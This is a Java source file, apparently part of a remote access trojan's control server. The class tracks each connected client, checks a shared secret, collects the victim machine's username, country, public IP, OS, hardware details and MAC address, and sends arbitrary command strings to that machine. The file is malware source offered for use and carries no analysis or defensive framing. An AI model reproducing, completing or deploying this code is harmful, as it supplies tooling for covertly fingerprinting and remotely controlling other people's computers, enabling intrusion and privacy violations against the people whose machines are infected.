package main.java.rat.server.connectedClients;

import main.java.Main;
import main.java.rat.handlers.InputOutputHandler;
import main.java.rat.listeners.InputOutputListener;
import main.java.rat.models.ComputerInfo;
import main.java.rat.models.SocketMessage;
import main.java.rat.models.StringSocketMessage;
import main.java.rat.server.RATServer;

import java.util.ArrayList;

public class RATConnectedClient implements InputOutputListener {

    private final RATServer server;
    private final InputOutputHandler inputOutput;
    private boolean initStage = false;
    private int id;

    public ComputerInfo clientComputerInfo;

    public RATConnectedClient(int id, InputOutputHandler inputOutputHandler, RATServer ratServer) {
        this.id = id;
        initStage = true;
        this.server = ratServer;
        this.inputOutput = inputOutputHandler;
        inputOutput.setListener(this);
    }

    @Override
    public void disconnected() {
        server.clientDisconnected(this);
    }

    @Override
    public void receivedMessage(Object message) {
        if(initStage) {
            if(message.equals(Main.SECRET)) {
                performInitStage();
            } else {
                server.incorrectSecret(this);
            }
        } else {

        }
    }

    public void sendCommand(String commandStr) {
        StringSocketMessage commandMessage = new StringSocketMessage();
        commandMessage.setContent(commandStr);
        commandMessage.setIsCommand();
        sendMessage(commandMessage);
    }

    public void sendMessage(SocketMessage message) {
        this.inputOutput.sendMessage(message);
    }

    private void performInitStage() {
        try {
            String version = (String) inputOutput.readNextMessage();
            this.clientComputerInfo = (ComputerInfo) inputOutput.readNextMessage();
            
            this.initStage = false;
            server.successInit(this, version);
        } catch (Exception e) {
            server.unknownInitError(this, e);
        }
    }

    public String getFormattedComputerInfo() {
        ArrayList<String> userInfoArr = new ArrayList<>();
        userInfoArr.add("User info (null when not able to read):");
        userInfoArr.add("Current Username:\t"+clientComputerInfo.getComputerUsername());
        userInfoArr.add("Country:\t"+clientComputerInfo.getCountry());
        userInfoArr.add("Public ip:\t"+clientComputerInfo.getPublicIp());
        userInfoArr.add("Operating system:\t"+clientComputerInfo.getOs());

        userInfoArr.add("CPU cores:\t"+clientComputerInfo.getCPUCores());

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getCPUNames(),
                "CPU:\t"
        ));

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getGPUs(),
                "GPU:\t"
        ));

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getMonitors(),
                "Monitor:\t"
        ));

        userInfoArr.addAll(clientComputerInfo.getAsPrependList(
                clientComputerInfo.getStorages(),
                "Storage device:\t"
        ));

        userInfoArr.add("MAC address:\t"+clientComputerInfo.getMacAddress());

        StringBuilder totalInfo = new StringBuilder();
        for(String infoLine : userInfoArr){
            totalInfo.append(infoLine);
            totalInfo.append("\n");
        }

        return totalInfo.toString();
    }

    public RATServer getServer() {
        return server;
    }

    public boolean isInitStage() {
        return initStage;
    }

    public int getId() {
        return id;
    }

    public String getFullName() {
        return "client ("+getId()+") '"+getName()+"'";
    }

    public String getName() {
        if(this.clientComputerInfo == null)
            return null;
        return this.clientComputerInfo.getComputerUsername();
    }
}
